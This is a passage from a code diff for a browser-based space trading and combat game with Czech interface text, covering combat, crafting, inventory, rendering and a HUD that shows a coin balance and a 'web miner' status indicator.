+            const target = game.autoBattleTarget;
+            if (!target || !game.enemies.includes(target)) {
+                game.autoBattle = false;
+                game.autoBattleTarget = null;
+                return;
+            }
+            const targetDir = Math.atan2(target.y - ship.y, target.x - ship.x);
+            shipRotateTo(targetDir);
+            fireWeapon();
+
+            target.fireTimer--;
+            if (target.fireTimer <= 0) {
+                target.fireTimer = target.shootCooldown || 45;
+                const inaccuracy = (1 - (target.accuracy || 0.7)) * 0.5;
+                const aimDir = Math.atan2(ship.y - target.y, ship.x - target.x) + rand(-inaccuracy, inaccuracy);
+                const bx = target.x + Math.cos(aimDir) * 16;
+                const by = target.y + Math.sin(aimDir) * 16;
+                const bvx = Math.cos(aimDir) * (4.5 + (target.type === 'Elite' ? 1.2 : 0));
+                const bvy = Math.sin(aimDir) * (4.5 + (target.type === 'Elite' ? 1.2 : 0));
+                game.enemyBullets.push({ x: bx, y: by, vx: bvx, vy: bvy, life: 80, damage: target.damage });
+            }
+
+            const midX = (ship.x + target.x) / 2;
+            const midY = (ship.y + target.y) / 2;
+            game.cameraX = lerp(game.cameraX, midX, 0.05);
+            game.cameraY = lerp(game.cameraY, midY, 0.05);
+            game.zoom = lerp(game.zoom, 0.5, 0.02);
+
+            if (dist(ship, target) > 500) {
+                game.autoBattle = false;
+                game.autoBattleTarget = null;
+                showMessage('Boji jste se prilis vzdalili!', 90);
+            }
+        }
+
+        // --- Collect Items ---
+        function collectNearbyItems() {
+            let collected = 0;
+            const collectDist = 120;
+            for (let i = game.floatingItems.length - 1; i >= 0; i--) {
+                const item = game.floatingItems[i];
+                const d = dist(ship, item);
+                if (d < collectDist) {
+                    if (shipAddCargo(item.name, 1)) {
+                        game.floatingItems.splice(i, 1);
+                        collected++;
+                    } else {
+                        showMessage('Naklad je plny!', 60);
+                        break;
+                    }
+                }
+            }
+            if (collected > 0) {
+                showMessage(`Sebrano ${collected}x predmetu`, 90);
+                saveGame();
+            } else {
+                showMessage('Žádné předměty v dosahu (J)', 60);
+            }
+        }
+
+        // --- Multiplayer ---
+        function toggleMultiplayer() {
+            game.multiplayer = !game.multiplayer;
+            if (game.multiplayer) {
+                game.remotePlayers = [];
+                for (let i = 0; i < 3; i++) {
+                    game.remotePlayers.push({
+                        id: i + 1,
+                        name: 'Player' + (i + 1),
+                        x: ship.x + rand(-300, 300),
+                        y: ship.y + rand(-300, 300),
+                        direction: rand(0, Math.PI * 2),
+                        hp: rand(60, 100),
+                        maxHp: 100,
+                        vx: rand(-1, 1),
+                        vy: rand(-1, 1),
+                    });
+                }
+                showMessage('Multiplayer simulace aktivni!', 90);
+            } else {
+                game.remotePlayers = [];
+                showMessage('Multiplayer deaktivovan', 60);
+            }
+        }
+
+        function updateRemotePlayers() {
+            if (!game.multiplayer) return;
+            for (const rp of game.remotePlayers) {
+                rp.x += rp.vx || rand(-0.3, 0.3);
+                rp.y += rp.vy || rand(-0.3, 0.3);
+                rp.direction += rand(-0.02, 0.02);
+                rp.hp = Math.max(20, Math.min(100, rp.hp + rand(-0.5, 0.5)));
+                if (rp.x < 0 || rp.x > WORLD_W) rp.vx = -rp.vx;
+                if (rp.y < 0 || rp.y > WORLD_H) rp.vy = -rp.vy;
+            }
+        }
+
+        // --- Crafting ---
+        function openCrafting() {
+            game.state = 'CRAFTING';
+            showScreen(craftingScreen);
+            renderCrafting();
+        }
+
+        function renderCrafting() {
+            const resources = game.inventory.cargo;
+            const ruda = resources['Ruda'] || 0;
+            const komp = resources['Komponenty'] || 0;
+            document.getElementById('craftingResources').textContent =
+                `Suroviny: Ruda: ${ruda}, Komponenty: ${komp}`;
+
+            const listDiv = document.getElementById('craftingList');
+            let html = '';
+            for (let i = 0; i < CRAFTING_RECIPES.length; i++) {
+                const rec = CRAFTING_RECIPES[i];
+                const needRuda = rec.requires.Ruda || 0;
+                const needKomp = rec.requires.Komponenty || 0;
+                const canCraft = (ruda >= needRuda && komp >= needKomp);
+                const slot = rec.slot;
+                const equipped = game.inventory.equipped[slot];
+                const alreadyEquipped = equipped && equipped.name === rec.name;
+                const color = canCraft && !alreadyEquipped ? '#ddd' : '#555';
+                const borderColor = canCraft && !alreadyEquipped ? '#3a8acc' : '#553333';
+                html += `<div class="item-row" data-action="craft" data-index="${i}" style="cursor:${canCraft && !alreadyEquipped ? 'pointer' : 'default'};border-color:${borderColor};color:${color};">
+                    <span class="name">${rec.name}</span>
+                    <span style="color:${canCraft ? '#88dd88' : '#666'};">R:${needRuda} K:${needKomp}</span>
+                    <span style="font-size:11px;color:#888;">slot: ${slot} ${alreadyEquipped ? '(již vybaveno)' : ''}</span>
+                </div>`;
+            }
+            listDiv.innerHTML = html;
+
+            document.querySelectorAll('#craftingList .item-row[data-action="craft"]').forEach(el => {
+                el.addEventListener('click', () => {
+                    const idx = parseInt(el.dataset.index);
+                    craftItem(idx);
+                });
+            });
+        }
+
+        function craftItem(index) {
+            const rec = CRAFTING_RECIPES[index];
+            if (!rec) return;
+            const resources = game.inventory.cargo;
+            const needRuda = rec.requires.Ruda || 0;
+            const needKomp = rec.requires.Komponenty || 0;
+            if ((resources['Ruda'] || 0) < needRuda || (resources['Komponenty'] || 0) < needKomp) {
+                showMessage('Nedostatek surovin!', 90);
+                return;
+            }
+            const slot = rec.slot;
+            if (game.inventory.equipped[slot] && game.inventory.equipped[slot].name === rec.name) {
+                showMessage('Toto vybavení už máte nasazeno!', 90);
+                return;
+            }
+            resources['Ruda'] -= needRuda;
+            resources['Komponenty'] -= needKomp;
+            const newItem = {
+                name: rec.name,
+                bonus: rec.bonus,
+                bonusVal: rec.bonusVal,
+                slot: rec.slot,
+            };
+            game.inventory.equipped[slot] = newItem;
+            showMessage(`Vyrobeno a vybaveno: ${rec.name}`, 90);
+            updatePassiveBonuses();
+            saveGame();
+            renderCrafting();
+        }
+
+        // --- Inventář ---
+        function openInventory() {
+            game.state = 'INVENTORY';
+            showScreen(inventoryScreen);
+            renderInventory();
+        }
+
+        function renderInventory() {
+            const cargoDiv = document.getElementById('cargoInventory');
+            const cargoItems = Object.entries(game.inventory.cargo);
+            let cargoHtml = '';
+            if (cargoItems.length === 0) {
+                cargoHtml = '<div style="color:#666;padding:12px;">Náklad prázdný</div>';
+            } else {
+                for (const [item, amount] of cargoItems) {
+                    cargoHtml += `<div class="item-row" style="cursor:default;">
+                        <span class="name">${item}</span>
+                        <span class="qty">${amount}x</span>
+                    </div>`;
+                }
+            }
+            cargoDiv.innerHTML = cargoHtml;
+
+            const slotsDiv = document.getElementById('equippedSlots');
+            const slotNames = {
+                trup: 'Trup',
+                stit: 'Štít',
+                motor: 'Motor',
+                zbran: 'Zbraň',
+                naklad: 'Náklad',
+                palivo: 'Palivo',
+                regenerace: 'Regenerace',
+                radar: 'Radar',
+                gyro: 'Gyroskop'
+            };
+            let slotsHtml = '';
+            for (const [slotId, label] of Object.entries(slotNames)) {
+                const item = game.inventory.equipped[slotId];
+                const hasItem = !!item;
+                slotsHtml += `<div class="slot-item ${hasItem ? 'equipped' : ''}" data-slot="${slotId}" style="cursor:${hasItem ? 'pointer' : 'default'};">
+                    <div class="slot-label">${label}</div>
+                    ${hasItem ? `<div class="slot-name">${item.name}</div><div class="slot-effect">+${item.bonusVal} ${item.bonus}</div>` : '<div style="color:#555;">prázdný</div>'}
+                </div>`;
+            }
+            slotsDiv.innerHTML = slotsHtml;
+
+            document.querySelectorAll('.slot-item[data-slot]').forEach(el => {
+                el.addEventListener('click', () => {
+                    const slotId = el.dataset.slot;
+                    if (game.inventory.equipped[slotId]) {
+                        game.inventory.equipped[slotId] = null;
+                        showMessage(`Vybavení odebráno ze slotu ${slotNames[slotId]}`, 90);
+                        updatePassiveBonuses();
+                        saveGame();
+                        renderInventory();
+                    }
+                });
+            });
+        }
+
+        // --- Smooth Movement Update ---
+        function processMovement() {
+            const keys = game.keys;
+            if (keys.left || keys.a) {
+                ship.direction -= ship.rotationSpeed * 1.6;
+            }
+            if (keys.right || keys.d) {
+                ship.direction += ship.rotationSpeed * 1.6;
+            }
+            if (keys.w || keys.up) {
+                shipApplyThrust(ship.direction, 1);
+                if (ship.fuel > 0) ship.fuel = Math.max(0, ship.fuel - 0.006);
+            }
+            if (keys.s || keys.down) {
+                shipApplyThrust(ship.direction + Math.PI, 0.7);
+                if (ship.fuel > 0) ship.fuel = Math.max(0, ship.fuel - 0.005);
+            }
+        }
+
+        // --- Game Update ---
+        function updateGame() {
+            if (Math.abs(ship.vx) > 0.1 || Math.abs(ship.vy) > 0.1) {
+                ship.fuel = Math.max(0, ship.fuel - 0.006);
+                if (ship.fuel <= 0) {
+                    ship.vx *= 0.99;
+                    ship.vy *= 0.99;
+                }
+            }
+
+            if (game.autoBattle) {
+                updateAutoBattle();
+            }
+
+            shipUpdate();
+
+            if (!game.autoBattle) {
+                game.cameraX = lerp(game.cameraX, ship.x, 0.07);
+                game.cameraY = lerp(game.cameraY, ship.y, 0.07);
+                game.zoom = lerp(game.zoom, 1.0, 0.02);
+            }
+
+            if (!ship.dockedAt) {
+                for (const p of game.planets) {
+                    if (dist(ship, p) < 70) {
+                        openDocked(p);
+                        checkQuestCompletion(p);
+                        saveGame();
+                        break;
+                    }
+                }
+            }
+
+            for (const e of game.enemies) {
+                const shot = e.update(ship.x, ship.y);
+                if (shot) {
+                    game.enemyBullets.push(shot);
+                }
+                if (e.x < 20) { e.x = 20;
+                    e.vx = Math.abs(e.vx) * 0.5; }
+                if (e.x > WORLD_W - 20) { e.x = WORLD_W - 20;
+                    e.vx = -Math.abs(e.vx) * 0.5; }
+                if (e.y < 20) { e.y = 20;
+                    e.vy = Math.abs(e.vy) * 0.5; }
+                if (e.y > WORLD_H - 20) { e.y = WORLD_H - 20;
+                    e.vy = -Math.abs(e.vy) * 0.5; }
+            }
+
+            const maxEnemies = 10 + ship.level * 1.2;
+            if (game.enemies.length < maxEnemies && Math.random() < 0.008) {
+                let x, y;
+                if (game.asteroids.length > 0) {
+                    const ref = game.asteroids.filter(a => !a.mined);
+                    if (ref.length > 0 && Math.random() < 0.6) {
+                        const r = ref[randInt(0, ref.length - 1)];
+                        const angle = rand(0, Math.PI * 2);
+                        const d = rand(100, 300);
+                        x = clamp(r.x + d * Math.cos(angle), 100, WORLD_W - 100);
+                        y = clamp(r.y + d * Math.sin(angle), 100, WORLD_H - 100);
+                    } else {
+                        x = rand(200, WORLD_W - 200);
+                        y = rand(200, WORLD_H - 200);
+                    }
+                } else {
+                    x = rand(200, WORLD_W - 200);
+                    y = rand(200, WORLD_H - 200);
+                }
+                const isElite = ship.level >= 3 && Math.random() < 0.15;
+                game.enemies.push(createEnemy(x, y, isElite ? 'Elite' : 'Pirate'));
+            }
+
+            updateBullets();
+
+            const now = Date.now();
+            game.floatingItems = game.floatingItems.filter(it => now - it.time < 300000);
+
+            if (game.miningActive) {
+                updateMining();
+            }
+
+            updateRemotePlayers();
+
+            game.autosaveTimer++;
+            if (game.autosaveTimer >= 600) {
+                game.autosaveTimer = 0;
+                saveGame();
+            }
+
+            if (game.dockedPlanet) {
+                game.dockedPlanet.updatePrices();
+            }
+
+            if (game.messageTimer > 0) {
+                game.messageTimer--;
+                if (game.messageTimer <= 0) game.message = '';
+            }
+
+            if (game.state === 'DOCKED' && game.dockedPlanet) {
+                document.getElementById('dockedShipStats').innerHTML =
+                    `HP: ${Math.round(ship.hp)}/${ship.maxHp} | Shield: ${Math.round(ship.shield)}/${ship.maxShield} | Palivo: ${Math.round(ship.fuel)}/${ship.maxFuel} | Naklad: ${shipGetTotalCargo()}/${ship.maxCargo}`;
+            }
+        }
+
+        // --- Drawing functions ---
+        function drawAsteroid(a) {
+            const sx = (a.x - game.cameraX) * game.zoom + SCREEN_W / 2;
+            const sy = (a.y - game.cameraY) * game.zoom + SCREEN_H / 2;
+            if (sx < -60 || sx > SCREEN_W + 60 || sy < -60 || sy > SCREEN_H + 60) return;
+            if (a.mined) return;
+
+            const r = Math.max(4, a.radius * game.zoom);
+            a.rotation += a.rotSpeed || 0;
+
+            ctx.fillStyle = 'rgba(0,0,0,0.3)';
+            ctx.beginPath();
+            ctx.arc(sx + 3, sy + 3, r, 0, Math.PI * 2);
+            ctx.fill();
+
+            ctx.fillStyle = a.color;
+            ctx.strokeStyle = a.colorDark;
+            ctx.lineWidth = 1.5;
+            ctx.beginPath();
+            for (let i = 0; i < a.vertices.length; i++) {
+                const v = a.vertices[i];
+                const angle = v.angle + a.rotation;
+                const dist2 = v.dist * game.zoom;
+                const px = sx + Math.cos(angle) * dist2;
+                const py = sy + Math.sin(angle) * dist2;
+                if (i === 0) ctx.moveTo(px, py);
+                else ctx.lineTo(px, py);
+            }
+            ctx.closePath();
+            ctx.fill();
+            ctx.stroke();
+
+            ctx.fillStyle = 'rgba(200,180,150,0.15)';
+            ctx.beginPath();
+            ctx.arc(sx - r * 0.2, sy - r * 0.3, r * 0.4, 0, Math.PI * 2);
+            ctx.fill();
+
+            if (game.zoom > 0.4) {
+                ctx.fillStyle = '#d4c8a8';
+                ctx.font = `${Math.max(7, 9 * game.zoom)}px monospace`;
+                ctx.textAlign = 'center';
+                ctx.textBaseline = 'bottom';
+                ctx.fillText(a.oreType, sx, sy - r - 2);
+            }
+
+            if (game.asteroidMiningTarget === a && game.asteroidMiningActive) {
+                const pct = a.sharesMined / a.sharesNeeded;
+                const bw = r * 1.8;
+                ctx.fillStyle = 'rgba(0,0,0,0.7)';
+                ctx.fillRect(sx - bw / 2, sy + r + 4, bw, 8);
+                ctx.fillStyle = '#88dd88';
+                ctx.fillRect(sx - bw / 2 + 1, sy + r + 5, (bw - 2) * pct, 6);
+                ctx.strokeStyle = '#666';
+                ctx.lineWidth = 0.5;
+                ctx.strokeRect(sx - bw / 2, sy + r + 4, bw, 8);
+            }
+        }
+
+        function drawPlanet(p) {
+            const sx = (p.x - game.cameraX) * game.zoom + SCREEN_W / 2;
+            const sy = (p.y - game.cameraY) * game.zoom + SCREEN_H / 2;
+            if (sx < -50 || sx > SCREEN_W + 50 || sy < -50 || sy > SCREEN_H + 50) return;
+
+            if (game.zoom > 0.3) {
+                const glowSize = p.radius * game.zoom * 2.5;
+                const grad = ctx.createRadialGradient(sx, sy, 0, sx, sy, glowSize);
+                grad.addColorStop(0, p.color + '40');
+                grad.addColorStop(1, 'rgba(0,0,0,0)');
+                ctx.fillStyle = grad;
+                ctx.beginPath();
+                ctx.arc(sx, sy, glowSize, 0, Math.PI * 2);
+                ctx.fill();
+            }
+
+            const r = Math.max(3, p.radius * game.zoom);
+            ctx.fillStyle = p.color;
+            ctx.beginPath();
+            ctx.arc(sx, sy, r, 0, Math.PI * 2);
+            ctx.fill();
+            ctx.strokeStyle = 'rgba(255,255,255,0.3)';
+            ctx.lineWidth = 1;
+            ctx.beginPath();
+            ctx.arc(sx, sy, r, 0, Math.PI * 2);
+            ctx.stroke();
+
+            if (game.zoom > 0.2 && (game.state === 'MAP' || game.zoom > 0.4)) {
+                ctx.fillStyle = '#ddd';
+                ctx.font = `${Math.max(9, 11 * Math.min(1, game.zoom * 1.5))}px monospace`;
+                ctx.textAlign = 'center';
+                ctx.textBaseline = 'bottom';
+                ctx.fillText(p.name, sx, sy - r - 2);
+                if (game.zoom > 0.5 || game.state === 'MAP') {
+                    ctx.fillStyle = '#888';
+                    ctx.font = `${Math.max(7, 9 * Math.min(1, game.zoom * 1.2))}px monospace`;
+                    ctx.textBaseline = 'top';
+                    ctx.fillText(p.getTypeName(), sx, sy + r + 2);
+                }
+            }
+
+            if (ship.dockedAt === p.name) {
+                ctx.strokeStyle = '#44ee88';
+                ctx.lineWidth = 2;
+                ctx.setLineDash([4, 6]);
+                ctx.beginPath();
+                ctx.arc(sx, sy, r + 8, 0, Math.PI * 2);
+                ctx.stroke();
+                ctx.setLineDash([]);
+            }
+        }
+
+        function drawEnemy(e) {
+            const sx = (e.x - game.cameraX) * game.zoom + SCREEN_W / 2;
+            const sy = (e.y - game.cameraY) * game.zoom + SCREEN_H / 2;
+            if (sx < -50 || sx > SCREEN_W + 50 || sy < -50 || sy > SCREEN_H + 50) return;
+
+            const size = Math.max(3, e.size * game.zoom);
+
+            const d = dist(e, ship);
+            if (d < 300) {
+                const alpha = Math.floor(80 * (1 - d / 300));
+                ctx.fillStyle = `rgba(255,0,0,${alpha/255})`;
+                ctx.beginPath();
+                ctx.arc(sx, sy, size * 1.8, 0, Math.PI * 2);
+                ctx.fill();
+            }
+
+            ctx.fillStyle = e.color;
+            ctx.beginPath();
+            ctx.moveTo(sx + size * Math.cos(e.direction), sy + size * Math.sin(e.direction));
+            ctx.lineTo(sx + size * 0.6 * Math.cos(e.direction + 2.3), sy + size * 0.6 * Math.sin(e.direction + 2.3));
+            ctx.lineTo(sx - size * 0.4 * Math.cos(e.direction), sy - size * 0.4 * Math.sin(e.direction));
+            ctx.lineTo(sx + size * 0.6 * Math.cos(e.direction - 2.3), sy + size * 0.6 * Math.sin(e.direction - 2.3));
+            ctx.closePath();
+            ctx.fill();
+            ctx.strokeStyle = '#cc6666';
+            ctx.lineWidth = 1;
+            ctx.stroke();
+
+            const hpPct = e.hp / e.maxHp;
+            const barW = size * 1.8;
+            ctx.fillStyle = '#333';
+            ctx.fillRect(sx - barW / 2, sy - size - 6, barW, 4);
+            ctx.fillStyle = hpPct > 0.5 ? '#44ee88' : hpPct > 0.25 ? '#eeee44' : '#dd6666';
+            ctx.fillRect(sx - barW / 2, sy - size - 6, barW * Math.max(0, hpPct), 4);
+
+            if (e.type === 'Elite') {
+                ctx.fillStyle = '#ff8844';
+                ctx.font = '8px monospace';
+                ctx.textAlign = 'center';
+                ctx.textBaseline = 'bottom';
+                ctx.fillText('ELITE', sx, sy - size - 10);
+            }
+        }
+
+        function drawRemotePlayer(rp) {
+            const sx = (rp.x - game.cameraX) * game.zoom + SCREEN_W / 2;
+            const sy = (rp.y - game.cameraY) * game.zoom + SCREEN_H / 2;
+            if (sx < -50 || sx > SCREEN_W + 50 || sy < -50 || sy > SCREEN_H + 50) return;
+            const size = Math.max(3, 12 * game.zoom);
+
+            const hue = (rp.id * 60) % 360;
+            const r = Math.floor(128 + 127 * Math.sin(hue * 0.01745));
+            const g = Math.floor(128 + 127 * Math.sin((hue + 120) * 0.01745));
+            const b = Math.floor(128 + 127 * Math.sin((hue + 240) * 0.01745));
+            const color = `rgb(${r},${g},${b})`;
+
+            ctx.fillStyle = color;
+            ctx.beginPath();
+            ctx.moveTo(sx + size * Math.cos(rp.direction), sy + size * Math.sin(rp.direction));
+            ctx.lineTo(sx + size * 0.6 * Math.cos(rp.direction + 2.3), sy + size * 0.6 * Math.sin(rp.direction + 2.3));
+            ctx.lineTo(sx - size * 0.5 * Math.cos(rp.direction), sy - size * 0.5 * Math.sin(rp.direction));
+            ctx.lineTo(sx + size * 0.6 * Math.cos(rp.direction - 2.3), sy + size * 0.6 * Math.sin(rp.direction - 2.3));
+            ctx.closePath();
+            ctx.fill();
+            ctx.strokeStyle = 'rgba(255,255,255,0.5)';
+            ctx.lineWidth = 1;
+            ctx.stroke();
+
+            ctx.fillStyle = '#66ddff';
+            ctx.font = '9px monospace';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'bottom';
+            ctx.fillText(rp.name, sx, sy - size - 2);
+
+            const hpPct = rp.hp / rp.maxHp;
+            const barW = size * 1.6;
+            ctx.fillStyle = '#333';
+            ctx.fillRect(sx - barW / 2, sy - size - 6, barW, 3);
+            ctx.fillStyle = hpPct > 0.5 ? '#44ee88' : '#eeee44';
+            ctx.fillRect(sx - barW / 2, sy - size - 6, barW * Math.max(0, hpPct), 3);
+        }
+
+        function drawShip() {
+            const sx = SCREEN_W / 2;
+            const sy = SCREEN_H / 2;
+            const size = Math.max(4, 14 * game.zoom);
+
+            if (Math.abs(ship.vx) > 0.15 || Math.abs(ship.vy) > 0.15) {
+                const ex = sx - size * 0.5 * Math.cos(ship.direction);
+                const ey = sy - size * 0.5 * Math.sin(ship.direction);
+                const grad = ctx.createRadialGradient(ex, ey, 0, ex, ey, size * 0.9);
+                grad.addColorStop(0, 'rgba(255,150,0,0.7)');
+                grad.addColorStop(0.4, 'rgba(255,100,0,0.3)');
+                grad.addColorStop(1, 'rgba(255,150,0,0)');
+                ctx.fillStyle = grad;
+                ctx.beginPath();
+                ctx.arc(ex, ey, size * 0.9, 0, Math.PI * 2);
+                ctx.fill();
+            }
+
+            ctx.fillStyle = '#44ee88';
+            ctx.beginPath();
+            ctx.moveTo(sx + size * Math.cos(ship.direction), sy + size * Math.sin(ship.direction));
+            ctx.lineTo(sx + size * 0.6 * Math.cos(ship.direction + 2.3), sy + size * 0.6 * Math.sin(ship.direction + 2.3));
+            ctx.lineTo(sx - size * 0.5 * Math.cos(ship.direction), sy - size * 0.5 * Math.sin(ship.direction));
+            ctx.lineTo(sx + size * 0.6 * Math.cos(ship.direction - 2.3), sy + size * 0.6 * Math.sin(ship.direction - 2.3));
+            ctx.closePath();
+            ctx.fill();
+            ctx.strokeStyle = '#88ffaa';
+            ctx.lineWidth = 1;
+            ctx.stroke();
+
+            const cx = sx + size * 0.3 * Math.cos(ship.direction);
+            const cy = sy + size * 0.3 * Math.sin(ship.direction);
+            ctx.fillStyle = 'rgba(100,200,255,0.4)';
+            ctx.beginPath();
+            ctx.arc(cx, cy, size * 0.2, 0, Math.PI * 2);
+            ctx.fill();
+
+            ctx.fillStyle = '#88dd88';
+            ctx.font = '11px monospace';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'bottom';
+            ctx.fillText(ship.name, sx, sy - size - 10);
+
+            const hpPct = ship.hp / ship.maxHp;
+            const barW = size * 2.2;
+            ctx.fillStyle = '#333';
+            ctx.fillRect(sx - barW / 2, sy - size - 20, barW, 5);
+            ctx.fillStyle = hpPct > 0.5 ? '#44ee88' : hpPct > 0.25 ? '#eeee44' : '#dd6666';
+            ctx.fillRect(sx - barW / 2, sy - size - 20, barW * Math.max(0, hpPct), 5);
+
+            const shieldPct = ship.shield / ship.maxShield;
+            ctx.fillStyle = '#333';
+            ctx.fillRect(sx - barW / 2, sy - size - 26, barW, 4);
+            ctx.fillStyle = '#4488ee';
+            ctx.fillRect(sx - barW / 2, sy - size - 26, barW * Math.max(0, shieldPct), 4);
+        }
+
+        function drawTopPanel() {
+            ctx.fillStyle = 'rgba(0,0,0,0.85)';
+            ctx.fillRect(0, 0, SCREEN_W, 90);
+
+            ctx.fillStyle = '#4488ee';
+            ctx.font = '16px monospace';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'top';
+            ctx.fillText('SPACE RANGERS - HAVIROV COIN EDITION', SCREEN_W / 2, 4);
+
+            const hpPct = ship.hp / ship.maxHp;
+            ctx.fillStyle = '#222';
+            ctx.fillRect(10, 30, 204, 18);
+            ctx.fillStyle = hpPct > 0.5 ? '#44ee88' : hpPct > 0.25 ? '#eeee44' : '#dd6666';
+            ctx.fillRect(12, 32, 200 * Math.max(0, hpPct), 14);
+            ctx.fillStyle = '#ddd';
+            ctx.font = '10px monospace';
+            ctx.textAlign = 'left';
+            ctx.textBaseline = 'top';
+            ctx.fillText(`HP: ${Math.round(ship.hp)}/${ship.maxHp}`, 220, 30);
+
+            const shieldPct = ship.shield / ship.maxShield;
+            ctx.fillStyle = '#222';
+            ctx.fillRect(10, 52, 204, 18);
+            ctx.fillStyle = '#4488ee';
+            ctx.fillRect(12, 54, 200 * Math.max(0, shieldPct), 14);
+            ctx.fillStyle = '#ddd';
+            ctx.fillText(`Shield: ${Math.round(ship.shield)}/${ship.maxShield}`, 220, 52);
+
+            const fuelPct = ship.fuel / ship.maxFuel;
+            ctx.fillStyle = '#222';
+            ctx.fillRect(10, 74, 204, 18);
+            ctx.fillStyle = '#ff8800';
+            ctx.fillRect(12, 76, 200 * Math.max(0, fuelPct), 14);
+            ctx.fillStyle = '#ddd';
+            ctx.fillText(`Fuel: ${Math.round(ship.fuel)}/${ship.maxFuel}`, 220, 74);
+
+            ctx.fillStyle = 'rgba(0,50,0,0.5)';
+            ctx.fillRect(330, 28, 200, 60);
+            ctx.strokeStyle = '#44ee88';
+            ctx.lineWidth = 1;
+            ctx.strokeRect(330, 28, 200, 60);
+            ctx.fillStyle = '#44ee88';
+            ctx.font = '16px monospace';
+            ctx.textAlign = 'left';
+            ctx.textBaseline = 'top';
+            ctx.fillText(`HVC: ${walletBalance.toFixed(4)}`, 338, 34);
+            ctx.fillStyle = '#66ddff';
+            ctx.font = '12px monospace';
+            ctx.fillText(`Cargo: ${shipGetTotalCargo()}/${ship.maxCargo}`, 338, 60);
+
+            ctx.fillStyle = 'rgba(50,0,50,0.5)';
+            ctx.fillRect(550, 28, 180, 60);
+            ctx.strokeStyle = '#aa66ff';
+            ctx.lineWidth = 1;
+            ctx.strokeRect(550, 28, 180, 60);
+            ctx.fillStyle = '#aa66ff';
+            ctx.font = '16px monospace';
+            ctx.textAlign = 'left';
+            ctx.textBaseline = 'top';
+            ctx.fillText(`Level: ${ship.level}`, 558, 34);
+            const xpPct = ship.xp / ship.xpToLevel;
+            ctx.fillStyle = '#333';
+            ctx.fillRect(558, 60, 160, 12);
+            ctx.fillStyle = '#aa66ff';
+            ctx.fillRect(560, 62, 156 * Math.min(1, xpPct), 8);
+            ctx.fillStyle = '#ddd';
+            ctx.font = '9px monospace';
+            ctx.fillText(`XP: ${Math.floor(ship.xp)}/${ship.xpToLevel}`, 558, 74);
+
+            const statusX = 750;
+            if (Object.keys(ship.appliedBonuses).length > 0 || ship.radarBonus > 0) {
+                const count = Object.keys(ship.appliedBonuses).length + (ship.radarBonus > 0 ? 1 : 0);
+                ctx.fillStyle = '#44ee88';
+                ctx.font = '10px monospace';
+                ctx.textAlign = 'left';
+                ctx.fillText(`Bonusy: ${count}x`, statusX, 20);
+            }
+            if (game.multiplayer) {
+                ctx.fillStyle = '#66ddff';
+                ctx.fillText(`MP: ${game.remotePlayers.length} hracu`, statusX, 36);
+                ctx.fillStyle = '#88dd88';
+                ctx.font = '10px monospace';
+                ctx.fillText(ship.name, statusX, 52);
+            } else if (ship.dockedAt) {
+                ctx.fillStyle = '#eeee44';
+                ctx.fillText(`Docked: ${ship.dockedAt}`, statusX, 40);
+            } else {
+                ctx.fillStyle = '#44ee88';
+                ctx.fillText('In flight', statusX, 40);
+            }
+
+            if (game.asteroidMiningActive && game.asteroidMiningTarget) {
+                ctx.fillStyle = '#8B7D6B';
+                ctx.fillText('🪨 MINING ASTEROID', statusX + 120, 40);
+            }
+
+            // Stav web minera – běží na pozadí, zobrazíme indikátor
+            if (webMiningActive) {
+                ctx.fillStyle = '#66ddff';
+                ctx.fillText(`⚡ Web miner: aktivní`, statusX, 68);
+            } else {
+                ctx.fillStyle = '#666';
+                ctx.fillText(`⚡ Web miner: neaktivní`, statusX, 68);
+            }
+        }
+
+        function drawRadar() {
+            const rx = RADAR_POS.x;
+            const ry = RADAR_POS.y;
+            const size = RADAR_SIZE;
+
+            ctx.fillStyle = 'rgba(5,5,20,0.85)';
+            ctx.fillRect(rx, ry, size, size);
+            ctx.strokeStyle = COLORS.borderColor;
+            ctx.lineWidth = 1;
+            ctx.strokeRect(rx, ry, size, size);
+
+            ctx.fillStyle = '#66ddff';
+            ctx.font = '10px monospace';
+            ctx.textAlign = 'left';
+            ctx.textBaseline = 'top';
+            ctx.fillText('RADAR', rx + 4, ry + 3);
+
+            const range = RADAR_RANGE + ship.radarBonus;
+            const scale = (size / 2) / range;
+
+            for (const r of [250, 500, 750, 1000, 1500]) {
+                const sr = r * scale;
+                ctx.strokeStyle = 'rgba(40,40,60,0.5)';
+                ctx.lineWidth = 0.5;
+                ctx.beginPath();
+                ctx.arc(rx + size / 2, ry + size / 2, Math.min(sr, size / 2), 0, Math.PI * 2);
+                ctx.stroke();
+            }
+
+            for (const p of game.planets) {
+                const relX = p.x - ship.x;
+                const relY = p.y - ship.y;
+                const d = Math.sqrt(relX * relX + relY * relY);
+                if (d <= range) {
+                    const sx = rx + size / 2 + relX * scale;
+                    const sy = ry + size / 2 + relY * scale;
+                    ctx.fillStyle = p.color;
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, 2, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            for (const e of game.enemies) {
+                const relX = e.x - ship.x;
+                const relY = e.y - ship.y;
+                const d = Math.sqrt(relX * relX + relY * relY);
+                if (d <= range) {
+                    const sx = rx + size / 2 + relX * scale;
+                    const sy = ry + size / 2 + relY * scale;
+                    ctx.fillStyle = '#ee4444';
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, 2, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            for (const rp of game.remotePlayers) {
+                const relX = rp.x - ship.x;
+                const relY = rp.y - ship.y;
+                const d = Math.sqrt(relX * relX + relY * relY);
+                if (d <= range) {
+                    const sx = rx + size / 2 + relX * scale;
+                    const sy = ry + size / 2 + relY * scale;
+                    ctx.fillStyle = '#66ddff';
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, 2, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            for (const item of game.floatingItems) {
+                const relX = item.x - ship.x;
+                const relY = item.y - ship.y;
+                const d = Math.sqrt(relX * relX + relY * relY);
+                if (d <= range) {
+                    const sx = rx + size / 2 + relX * scale;
+                    const sy = ry + size / 2 + relY * scale;
+                    ctx.fillStyle = '#ffff66';
+                    ctx.beginPath();
+                    ctx.arc(sx, sy, 1.5, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            for (const a of game.asteroids) {
+                if (a.mined) continue;
+                const relX = a.x - ship.x;
+                const relY = a.y - ship.y;
+                const d = Math.sqrt(relX * relX + relY * relY);
+                if (d <= range) {
+                    const sx = rx + size / 2 + relX * scale;
